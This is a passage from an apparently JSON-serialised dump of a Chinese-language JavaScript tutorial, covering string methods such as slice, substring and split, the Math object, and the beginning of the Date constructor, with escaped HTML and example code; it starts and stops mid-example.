&quot;b&quot;</code></pre><p>如果参数为负数，或大于等于字符串的长度，<code>charAt</code>返回空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charAt(-1) // &quot;&quot;\n&#039;abc&#039;.charAt(3) // &quot;&quot;</code></pre>\n        <h3>\n            <a href='#String.prototype.charCodeAt()' class='header-anchor'>#</a>\n            <span>String.prototype.charCodeAt()</span>\n        </h3>\n    <p><code>charCodeAt</code>方法返回字符串指定位置的 Unicode 码点（十进制表示），相当于<code>String.fromCharCode()</code>的逆操作。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charCodeAt(1) // 98</code></pre><p>上面代码中，<code>abc</code>的<code>1</code>号位置的字符是<code>b</code>，它的 Unicode 码点是<code>98</code>。</p>\n<p>如果没有任何参数，<code>charCodeAt</code>返回首字符的 Unicode 码点。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charCodeAt() // 97</code></pre><p>如果参数为负数，或大于等于字符串的长度，<code>charCodeAt</code>返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charCodeAt(-1) // NaN\n&#039;abc&#039;.charCodeAt(4) // NaN</code></pre><p>注意，<code>charCodeAt</code>方法返回的 Unicode 码点不会大于65536（0xFFFF），也就是说，只返回两个字节的字符的码点。如果遇到码点大于 65536 的字符（四个字节的字符），必需连续使用两次<code>charCodeAt</code>，不仅读入<code>charCodeAt(i)</code>，还要读入<code>charCodeAt(i+1)</code>，将两个值放在一起，才能得到准确的字符。</p>\n\n        <h3>\n            <a href='#String.prototype.concat()' class='header-anchor'>#</a>\n            <span>String.prototype.concat()</span>\n        </h3>\n    <p><code>concat</code>方法用于连接两个字符串，返回一个新字符串，不改变原字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s1 = &#039;abc&#039;;\nvar s2 = &#039;def&#039;;\n\ns1.concat(s2) // &quot;abcdef&quot;\ns1 // &quot;abc&quot;</code></pre><p>该方法可以接受多个参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a&#039;.concat(&#039;b&#039;, &#039;c&#039;) // &quot;abc&quot;</code></pre><p>如果参数不是字符串，<code>concat</code>方法会将其先转为字符串，然后再连接。</p>\n<pre class=\"prettyprint language-javascript\"><code>var one = 1;\nvar two = 2;\nvar three = &#039;3&#039;;\n\n&#039;&#039;.concat(one, two, three) // &quot;123&quot;\none + two + three // &quot;33&quot;</code></pre><p>上面代码中，<code>concat</code>方法将参数先转成字符串再连接，所以返回的是一个三个字符的字符串。作为对比，加号运算符在两个运算数都是数值时，不会转换类型，所以返回的是一个两个字符的字符串。</p>\n\n        <h3>\n            <a href='#String.prototype.slice()' class='header-anchor'>#</a>\n            <span>String.prototype.slice()</span>\n        </h3>\n    <p><code>slice</code>方法用于从原字符串取出子字符串并返回，不改变原字符串。它的第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置（不含该位置）。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.slice(0, 4) // &quot;Java&quot;</code></pre><p>如果省略第二个参数，则表示子字符串一直到原字符串结束。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.slice(4) // &quot;Script&quot;</code></pre><p>如果参数是负值，表示从结尾开始倒数计算的位置，即该负值加上字符串长度。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.slice(-6) // &quot;Script&quot;\n&#039;JavaScript&#039;.slice(0, -6) // &quot;Java&quot;\n&#039;JavaScript&#039;.slice(-2, -1) // &quot;p&quot;</code></pre><p>如果第一个参数大于第二个参数，<code>slice</code>方法返回一个空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.slice(2, 1) // &quot;&quot;</code></pre>\n        <h3>\n            <a href='#String.prototype.substring()' class='header-anchor'>#</a>\n            <span>String.prototype.substring()</span>\n        </h3>\n    <p><code>substring</code>方法用于从原字符串取出子字符串并返回，不改变原字符串，跟<code>slice</code>方法很相像。它的第一个参数表示子字符串的开始位置，第二个位置表示结束位置（返回结果不含该位置）。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substring(0, 4) // &quot;Java&quot;</code></pre><p>如果省略第二个参数，则表示子字符串一直到原字符串的结束。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substring(4) // &quot;Script&quot;</code></pre><p>如果第一个参数大于第二个参数，<code>substring</code>方法会自动更换两个参数的位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substring(10, 4) // &quot;Script&quot;\n// 等同于\n&#039;JavaScript&#039;.substring(4, 10) // &quot;Script&quot;</code></pre><p>上面代码中，调换<code>substring</code>方法的两个参数，都得到同样的结果。</p>\n<p>如果参数是负数，<code>substring</code>方法会自动将负数转为0。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;Javascript&#039;.substring(-3) // &quot;JavaScript&quot;\n&#039;JavaScript&#039;.substring(4, -3) // &quot;Java&quot;</code></pre><p>上面代码中，第二个例子的参数<code>-3</code>会自动变成<code>0</code>，等同于<code>&#39;JavaScript&#39;.substring(4, 0)</code>。由于第二个参数小于第一个参数，会自动互换位置，所以返回<code>Java</code>。</p>\n<p>由于这些规则违反直觉，因此不建议使用<code>substring</code>方法，应该优先使用<code>slice</code>。</p>\n\n        <h3>\n            <a href='#String.prototype.substr()' class='header-anchor'>#</a>\n            <span>String.prototype.substr()</span>\n        </h3>\n    <p><code>substr</code>方法用于从原字符串取出子字符串并返回，不改变原字符串，跟<code>slice</code>和<code>substring</code>方法的作用相同。</p>\n<p><code>substr</code>方法的第一个参数是子字符串的开始位置（从0开始计算），第二个参数是子字符串的长度。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substr(4, 6) // &quot;Script&quot;</code></pre><p>如果省略第二个参数，则表示子字符串一直到原字符串的结束。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substr(4) // &quot;Script&quot;</code></pre><p>如果第一个参数是负数，表示倒数计算的字符位置。如果第二个参数是负数，将被自动转为0，因此会返回空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substr(-6) // &quot;Script&quot;\n&#039;JavaScript&#039;.substr(4, -1) // &quot;&quot;</code></pre><p>上面代码中，第二个例子的参数<code>-1</code>自动转为<code>0</code>，表示子字符串长度为<code>0</code>，所以返回空字符串。</p>\n\n        <h3>\n            <a href='#String.prototype.indexOf()，String.prototype.lastIndexOf()' class='header-anchor'>#</a>\n            <span>String.prototype.indexOf()，String.prototype.lastIndexOf()</span>\n        </h3>\n    <p><code>indexOf</code>方法用于确定一个字符串在另一个字符串中第一次出现的位置，返回结果是匹配开始的位置。如果返回<code>-1</code>，就表示不匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;hello world&#039;.indexOf(&#039;o&#039;) // 4\n&#039;JavaScript&#039;.indexOf(&#039;script&#039;) // -1</code></pre><p><code>indexOf</code>方法还可以接受第二个参数，表示从该位置开始向后匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;hello world&#039;.indexOf(&#039;o&#039;, 6) // 7</code></pre><p><code>lastIndexOf</code>方法的用法跟<code>indexOf</code>方法一致，主要的区别是<code>lastIndexOf</code>从尾部开始匹配，<code>indexOf</code>则是从头部开始匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;hello world&#039;.lastIndexOf(&#039;o&#039;) // 7</code></pre><p>另外，<code>lastIndexOf</code>的第二个参数表示从该位置起向前匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;hello world&#039;.lastIndexOf(&#039;o&#039;, 6) // 4</code></pre>\n        <h3>\n            <a href='#String.prototype.trim()' class='header-anchor'>#</a>\n            <span>String.prototype.trim()</span>\n        </h3>\n    <p><code>trim</code>方法用于去除字符串两端的空格，返回一个新字符串，不改变原字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;  hello world  &#039;.trim()\n// &quot;hello world&quot;</code></pre><p>该方法去除的不仅是空格，还包括制表符（<code>\\t</code>、<code>\\v</code>）、换行符（<code>\\n</code>）和回车符（<code>\\r</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;\\r\\nabc \\t&#039;.trim() // &#039;abc&#039;</code></pre>\n        <h3>\n            <a href='#String.prototype.toLowerCase()，String.prototype.toUpperCase()' class='header-anchor'>#</a>\n            <span>String.prototype.toLowerCase()，String.prototype.toUpperCase()</span>\n        </h3>\n    <p><code>toLowerCase</code>方法用于将一个字符串全部转为小写，<code>toUpperCase</code>则是全部转为大写。它们都返回一个新字符串，不改变原字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;Hello World&#039;.toLowerCase()\n// &quot;hello world&quot;\n\n&#039;Hello World&#039;.toUpperCase()\n// &quot;HELLO WORLD&quot;</code></pre>\n        <h3>\n            <a href='#String.prototype.match()' class='header-anchor'>#</a>\n            <span>String.prototype.match()</span>\n        </h3>\n    <p><code>match</code>方法用于确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;cat, bat, sat, fat&#039;.match(&#039;at&#039;) // [&quot;at&quot;]\n&#039;cat, bat, sat, fat&#039;.match(&#039;xt&#039;) // null</code></pre><p>返回的数组还有<code>index</code>属性和<code>input</code>属性，分别表示匹配字符串开始的位置和原始字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var matches = &#039;cat, bat, sat, fat&#039;.match(&#039;at&#039;);\nmatches.index // 1\nmatches.input // &quot;cat, bat, sat, fat&quot;</code></pre><p><code>match</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一章。</p>\n\n        <h3>\n            <a href='#String.prototype.search()，String.prototype.replace()' class='header-anchor'>#</a>\n            <span>String.prototype.search()，String.prototype.replace()</span>\n        </h3>\n    <p><code>search</code>方法的用法基本等同于<code>match</code>，但是返回值为匹配的第一个位置。如果没有找到匹配，则返回<code>-1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;cat, bat, sat, fat&#039;.search(&#039;at&#039;) // 1</code></pre><p><code>search</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一节。</p>\n<p><code>replace</code>方法用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有<code>g</code>修饰符的正则表达式）。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;aaa&#039;.replace(&#039;a&#039;, &#039;b&#039;) // &quot;baa&quot;</code></pre><p><code>replace</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一节。</p>\n\n        <h3>\n            <a href='#String.prototype.split()' class='header-anchor'>#</a>\n            <span>String.prototype.split()</span>\n        </h3>\n    <p><code>split</code>方法按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a|b|c&#039;.split(&#039;|&#039;) // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code></pre><p>如果分割规则为空字符串，则返回数组的成员是原字符串的每一个字符。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a|b|c&#039;.split(&#039;&#039;) // [&quot;a&quot;, &quot;|&quot;, &quot;b&quot;, &quot;|&quot;, &quot;c&quot;]</code></pre><p>如果省略参数，则返回数组的唯一成员就是原字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a|b|c&#039;.split() // [&quot;a|b|c&quot;]</code></pre><p>如果满足分割规则的两个部分紧邻着（即两个分割符中间没有其他字符），则返回数组之中会有一个空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a||c&#039;.split(&#039;|&#039;) // [&#039;a&#039;, &#039;&#039;, &#039;c&#039;]</code></pre><p>如果满足分割规则的部分处于字符串的开头或结尾（即它的前面或后面没有其他字符），则返回数组的第一个或最后一个成员是一个空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;|b|c&#039;.split(&#039;|&#039;) // [&quot;&quot;, &quot;b&quot;, &quot;c&quot;]\n&#039;a|b|&#039;.split(&#039;|&#039;) // [&quot;a&quot;, &quot;b&quot;, &quot;&quot;]</code></pre><p><code>split</code>方法还可以接受第二个参数，限定返回数组的最大成员数。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a|b|c&#039;.split(&#039;|&#039;, 0) // []\n&#039;a|b|c&#039;.split(&#039;|&#039;, 1) // [&quot;a&quot;]\n&#039;a|b|c&#039;.split(&#039;|&#039;, 2) // [&quot;a&quot;, &quot;b&quot;]\n&#039;a|b|c&#039;.split(&#039;|&#039;, 3) // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]\n&#039;a|b|c&#039;.split(&#039;|&#039;, 4) // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code></pre><p>上面代码中，<code>split</code>方法的第二个参数，决定了返回数组的成员数。</p>\n<p><code>split</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一节。</p>\n\n        <h3>\n            <a href='#String.prototype.localeCompare()' class='header-anchor'>#</a>\n            <span>String.prototype.localeCompare()</span>\n        </h3>\n    <p><code>localeCompare</code>方法用于比较两个字符串。它返回一个整数，如果小于0，表示第一个字符串小于第二个字符串；如果等于0，表示两者相等；如果大于0，表示第一个字符串大于第二个字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;apple&#039;.localeCompare(&#039;banana&#039;) // -1\n&#039;apple&#039;.localeCompare(&#039;apple&#039;) // 0</code></pre><p>该方法的最大特点，就是会考虑自然语言的顺序。举例来说，正常情况下，大写的英文字母小于小写字母。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;B&#039; &gt; &#039;a&#039; // false</code></pre><p>上面代码中，字母<code>B</code>小于字母<code>a</code>。因为 JavaScript 采用的是 Unicode 码点比较，<code>B</code>的码点是66，而<code>a</code>的码点是97。</p>\n<p>但是，<code>localeCompare</code>方法会考虑自然语言的排序情况，将<code>B</code>排在<code>a</code>的前面。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;B&#039;.localeCompare(&#039;a&#039;) // 1</code></pre><p>上面代码中，<code>localeCompare</code>方法返回整数1，表示<code>B</code>较大。</p>\n<p><code>localeCompare</code>还可以有第二个参数，指定所使用的语言（默认是英语），然后根据该语言的规则进行比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;ä&#039;.localeCompare(&#039;z&#039;, &#039;de&#039;) // -1\n&#039;ä&#039;.localeCompare(&#039;z&#039;, &#039;sv&#039;) // 1</code></pre><p>上面代码中，<code>de</code>表示德语，<code>sv</code>表示瑞典语。德语中，<code>ä</code>小于<code>z</code>，所以返回<code>-1</code>；瑞典语中，<code>ä</code>大于<code>z</code>，所以返回<code>1</code>。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Ariya Hidayat, <a href=\"http://ariya.ofilabs.com/2014/02/javascript-string-substring-substr-slice.html\">JavaScript String: substring, substr, slice</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Math 对象","link":"/stdlib/math.html"}],"content":"\n        <h1>\n            <a href='#Math-对象' class='header-anchor'>#</a>\n            <span>Math 对象</span>\n        </h1>\n    <p><code>Math</code>是 JavaScript 的原生对象，提供各种数学功能。该对象不是构造函数，不能生成实例，所有的属性和方法都必须在<code>Math</code>对象上调用。</p>\n\n        <h2>\n            <a href='#静态属性' class='header-anchor'>#</a>\n            <span>静态属性</span>\n        </h2>\n    <p><code>Math</code>对象的静态属性，提供以下一些数学常数。</p>\n<ul>\n<li><code>Math.E</code>：常数<code>e</code>。</li>\n<li><code>Math.LN2</code>：2 的自然对数。</li>\n<li><code>Math.LN10</code>：10 的自然对数。</li>\n<li><code>Math.LOG2E</code>：以 2 为底的<code>e</code>的对数。</li>\n<li><code>Math.LOG10E</code>：以 10 为底的<code>e</code>的对数。</li>\n<li><code>Math.PI</code>：常数 Pi。</li>\n<li><code>Math.SQRT1_2</code>：0.5 的平方根。</li>\n<li><code>Math.SQRT2</code>：2 的平方根。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>Math.E // 2.718281828459045\nMath.LN2 // 0.6931471805599453\nMath.LN10 // 2.302585092994046\nMath.LOG2E // 1.4426950408889634\nMath.LOG10E // 0.4342944819032518\nMath.PI // 3.141592653589793\nMath.SQRT1_2 // 0.7071067811865476\nMath.SQRT2 // 1.4142135623730951</code></pre><p>这些属性都是只读的，不能修改。</p>\n\n        <h2>\n            <a href='#静态方法' class='header-anchor'>#</a>\n            <span>静态方法</span>\n        </h2>\n    <p><code>Math</code>对象提供以下一些静态方法。</p>\n<ul>\n<li><code>Math.abs()</code>：绝对值</li>\n<li><code>Math.ceil()</code>：向上取整</li>\n<li><code>Math.floor()</code>：向下取整</li>\n<li><code>Math.max()</code>：最大值</li>\n<li><code>Math.min()</code>：最小值</li>\n<li><code>Math.pow()</code>：指数运算</li>\n<li><code>Math.sqrt()</code>：平方根</li>\n<li><code>Math.log()</code>：自然对数</li>\n<li><code>Math.exp()</code>：e的指数</li>\n<li><code>Math.round()</code>：四舍五入</li>\n<li><code>Math.random()</code>：随机数</li>\n</ul>\n\n        <h3>\n            <a href='#Math.abs()' class='header-anchor'>#</a>\n            <span>Math.abs()</span>\n        </h3>\n    <p><code>Math.abs</code>方法返回参数值的绝对值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.abs(1) // 1\nMath.abs(-1) // 1</code></pre>\n        <h3>\n            <a href='#Math.max()，Math.min()' class='header-anchor'>#</a>\n            <span>Math.max()，Math.min()</span>\n        </h3>\n    <p><code>Math.max</code>方法返回参数之中最大的那个值，<code>Math.min</code>返回最小的那个值。如果参数为空, <code>Math.min</code>返回<code>Infinity</code>, <code>Math.max</code>返回<code>-Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.max(2, -1, 5) // 5\nMath.min(2, -1, 5) // -1\nMath.min() // Infinity\nMath.max() // -Infinity</code></pre>\n        <h3>\n            <a href='#Math.floor()，Math.ceil()' class='header-anchor'>#</a>\n            <span>Math.floor()，Math.ceil()</span>\n        </h3>\n    <p><code>Math.floor</code>方法返回小于参数值的最大整数（地板值）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.floor(3.2) // 3\nMath.floor(-3.2) // -4</code></pre><p><code>Math.ceil</code>方法返回大于参数值的最小整数（天花板值）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.ceil(3.2) // 4\nMath.ceil(-3.2) // -3</code></pre><p>这两个方法可以结合起来，实现一个总是返回数值的整数部分的函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function ToInteger(x) {\n  x = Number(x);\n  return x &lt; 0 ? Math.ceil(x) : Math.floor(x);\n}\n\nToInteger(3.2) // 3\nToInteger(3.5) // 3\nToInteger(3.8) // 3\nToInteger(-3.2) // -3\nToInteger(-3.5) // -3\nToInteger(-3.8) // -3</code></pre><p>上面代码中，不管正数或负数，<code>ToInteger</code>函数总是返回一个数值的整数部分。</p>\n\n        <h3>\n            <a href='#Math.round()' class='header-anchor'>#</a>\n            <span>Math.round()</span>\n        </h3>\n    <p><code>Math.round</code>方法用于四舍五入。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.round(0.1) // 0\nMath.round(0.5) // 1\nMath.round(0.6) // 1\n\n// 等同于\nMath.floor(x + 0.5)</code></pre><p>注意，它对负数的处理（主要是对<code>0.5</code>的处理）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.round(-1.1) // -1\nMath.round(-1.5) // -1\nMath.round(-1.6) // -2</code></pre>\n        <h3>\n            <a href='#Math.pow()' class='header-anchor'>#</a>\n            <span>Math.pow()</span>\n        </h3>\n    <p><code>Math.pow</code>方法返回以第一个参数为底数、第二个参数为幂的指数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等同于 2 ** 2\nMath.pow(2, 2) // 4\n// 等同于 2 ** 3\nMath.pow(2, 3) // 8</code></pre><p>下面是计算圆面积的方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var radius = 20;\nvar area = Math.PI * Math.pow(radius, 2);</code></pre>\n        <h3>\n            <a href='#Math.sqrt()' class='header-anchor'>#</a>\n            <span>Math.sqrt()</span>\n        </h3>\n    <p><code>Math.sqrt</code>方法返回参数值的平方根。如果参数是一个负值，则返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.sqrt(4) // 2\nMath.sqrt(-4) // NaN</code></pre>\n        <h3>\n            <a href='#Math.log()' class='header-anchor'>#</a>\n            <span>Math.log()</span>\n        </h3>\n    <p><code>Math.log</code>方法返回以<code>e</code>为底的自然对数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.log(Math.E) // 1\nMath.log(10) // 2.302585092994046</code></pre><p>如果要计算以10为底的对数，可以先用<code>Math.log</code>求出自然对数，然后除以<code>Math.LN10</code>；求以2为底的对数，可以除以<code>Math.LN2</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.log(100)/Math.LN10 // 2\nMath.log(8)/Math.LN2 // 3</code></pre>\n        <h3>\n            <a href='#Math.exp()' class='header-anchor'>#</a>\n            <span>Math.exp()</span>\n        </h3>\n    <p><code>Math.exp</code>方法返回常数<code>e</code>的参数次方。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.exp(1) // 2.718281828459045\nMath.exp(3) // 20.085536923187668</code></pre>\n        <h3>\n            <a href='#Math.random()' class='header-anchor'>#</a>\n            <span>Math.random()</span>\n        </h3>\n    <p><code>Math.random()</code>返回0到1之间的一个伪随机数，可能等于0，但是一定小于1。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.random() // 0.7151307314634323</code></pre><p>任意范围的随机数生成函数如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>function getRandomArbitrary(min, max) {\n  return Math.random() * (max - min) + min;\n}\n\ngetRandomArbitrary(1.5, 6.5)\n// 2.4942810038223864</code></pre><p>任意范围的随机整数生成函数如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>function getRandomInt(min, max) {\n  return Math.floor(Math.random() * (max - min + 1)) + min;\n}\n\ngetRandomInt(1, 6) // 5</code></pre><p>返回随机字符的例子如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>function random_str(length) {\n  var ALPHABET = &#039;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#039;;\n  ALPHABET += &#039;abcdefghijklmnopqrstuvwxyz&#039;;\n  ALPHABET += &#039;0123456789-_&#039;;\n  var str = &#039;&#039;;\n  for (var i=0; i &lt; length; ++i) {\n    var rand = Math.floor(Math.random() * ALPHABET.length);\n    str += ALPHABET.substring(rand, rand + 1);\n  }\n  return str;\n}\n\nrandom_str(6) // &quot;NdQKOr&quot;</code></pre><p>上面代码中，<code>random_str</code>函数接受一个整数作为参数，返回变量<code>ALPHABET</code>内的随机字符所组成的指定长度的字符串。</p>\n\n        <h3>\n            <a href='#三角函数方法' class='header-anchor'>#</a>\n            <span>三角函数方法</span>\n        </h3>\n    <p><code>Math</code>对象还提供一系列三角函数方法。</p>\n<ul>\n<li><code>Math.sin()</code>：返回参数的正弦（参数为弧度值）</li>\n<li><code>Math.cos()</code>：返回参数的余弦（参数为弧度值）</li>\n<li><code>Math.tan()</code>：返回参数的正切（参数为弧度值）</li>\n<li><code>Math.asin()</code>：返回参数的反正弦（返回值为弧度值）</li>\n<li><code>Math.acos()</code>：返回参数的反余弦（返回值为弧度值）</li>\n<li><code>Math.atan()</code>：返回参数的反正切（返回值为弧度值）</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>Math.sin(0) // 0\nMath.cos(0) // 1\nMath.tan(0) // 0\n\nMath.sin(Math.PI / 2) // 1\n\nMath.asin(1) // 1.5707963267948966\nMath.acos(1) // 0\nMath.atan(1) // 0.7853981633974483</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Date 对象","link":"/stdlib/date.html"}],"content":"\n        <h1>\n            <a href='#Date-对象' class='header-anchor'>#</a>\n            <span>Date 对象</span>\n        </h1>\n    <p><code>Date</code>对象是 JavaScript 原生的时间库。它以1970年1月1日00:00:00作为时间的零点，可以表示的时间范围是前后各1亿天（单位为毫秒）。</p>\n\n        <h2>\n            <a href='#普通函数的用法' class='header-anchor'>#</a>\n            <span>普通函数的用法</span>\n        </h2>\n    <p><code>Date</code>对象可以作为普通函数直接调用，返回一个代表当前时间的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date()\n// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;</code></pre><p>注意，即使带有参数，<code>Date</code>作为普通函数使用时，返回的还是当前时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date(2000, 1, 1)\n// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;</code></pre><p>上面代码说明，无论有没有参数，直接调用<code>Date</code>总是返回当前时间。</p>\n\n        <h2>\n            <a href='#构造函数的用法' class='header-anchor'>#</a>\n            <span>构造函数的用法</span>\n        </h2>\n    <p><code>Date</code>还可以当作构造函数使用。对它使用<code>new</code>命令，会返回一个<code>Date</code>对象的实例。如果不加参数，实例代表的就是当前时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>var today = new Date();</code></pre><p><code>Date</code>实例有一个独特的地方。其他对象求值的时候，都是默认调用<code>.valueOf()</code>方法，但是<code>Date</code>实例求值的时候，默认调用的是<code>toString()</code>方法。这导致对<code>Date</code>实例求值，返回的是一个字符串，代表该实例对应的时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>var today = new Date();\n\ntoday\n// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;\n\n// 等同于\ntoday.toString()\n// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;</code></pre><p>上面代码中，<code>today</code>是<code>Date</code>的实例，直接求值等同于调用<code>toString</code>方法。</p>\n<p>作为构造函数时，<code>Date</code>对象可以接受多种格式的参数，返回一个该参数对应的时间实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 参数为时间零点开始计算的毫秒数\nnew Date(1378218728000)\n// Tue Sep 03 2013 22:32:08 GMT+0800 (CST)\n\n// 参数为日期字符串\nnew Date(&#039;January 6, 2013&#039;);\n// Sun Jan 06 2013 00:00:00 GMT+0800 (CST)\n\n// 参数为多个整数，\n// 代表年、月、日、小时、分钟、秒、毫秒\nnew Date(2013, 0, 1, 0, 0, 0, 0)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)</code></pre><p>关于<code>Date</code>构造函数的参数，有几点说明。</p>\n<p>第一点，参数可以是负整数，代表1970年元旦之前的时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(-1378218728000)\n// Fri Apr 30 1926 17:27:52 GMT+0800 (CST)</code></pre><p>第二点，只要是能被<code>Date.parse()</code>方法解析的字符串，都可以当作参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(&#039;2013-2-15&#039;)\nnew Date(&#039;2013/2/15&#039;)\nnew Date(&#039;02/15/2013&#039;)\nnew Date(&#039;2013-FEB-15&#039;)\nnew Date(&#039;FEB, 15, 2013&#039;)\nnew Date(&#039;FEB 15, 2013&#039;)\nnew Date(&#039;Feberuary, 15, 2013&#039;)\nnew Date(&#039;Feberuary 15, 2013&#039;)\nnew Date(&#039;15 Feb 2013&#039;)\nnew Date(&#039;15, Feberuary, 2013&#039;)\n// Fri Feb 15 2013 00:00:00 GMT+0800 (CST)</code></pre><p>上面多种日期字符串的写法，返回的都是同一个时间。</p>\n<p>第三，参数为年、月、日等多个整数时，年和月是不能省略的，其他参数都可以省略的。也就是说，这时至少需要两个参数，因为如果只使用“年”这一个参数，<code>Date</code>会将其解释为毫秒数。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(2013)\n// Thu Jan 01 1970 08:00:02 GMT+0800 (CST)</code></pre><p>上面代码中，2013被解释为毫秒数，而不是年份。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(2013, 0)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)\nnew Date(2013, 0, 1)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)\nnew Date(2013, 0, 1, 0)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)\nnew Date(2013, 0, 1, 0, 0, 0, 0)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)</code></pre><p>上面代码中，不管有几个参数，返回的都是2013年1月1日零点。</p>\n<p>最后，各个参数的取值范围如下。</p>\n<ul>\n<li>年：使用四位数年份，比如<code>2000</code>。如果写成两位数或个位数，则加上<code>1900</code>，即<code>10</code>代表1910年。如果是负数，表示公元前。</li>\n<li>月：<code>0</code>表示一月，依次类推，<code>11</code>表示12月。</li>\n<li>日：<code>1</code>到<code>31</code>。</li>\n<li>小时：<code>0</code>到<code>23</code>。</li>\n<li>分钟：<code>0</code>到<code>59</code>。</li>\n<li>秒：<code>0</code>到<code>59</code></li>\n<li>毫秒：<code>0</code>到<code>999</code>。</li>\n</ul>\n<p>注意，月份从<code>0</code>开始计算，但是，天数从<code>1</code>开始计算。另外，除了日期的默认值为<code>1</code>，小时、分钟、秒钟和毫秒的默认值都是<code>0</code>。</p>\n<p>这些参数如果超出了正常范围，会被自动折算。比如，如果月设为<code>15</code>，就折算为下一年的4月。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(2013, 15)\n// Tue Apr 01 2014 00:00:00 GMT+0800 (CST)\nnew Date(2013, 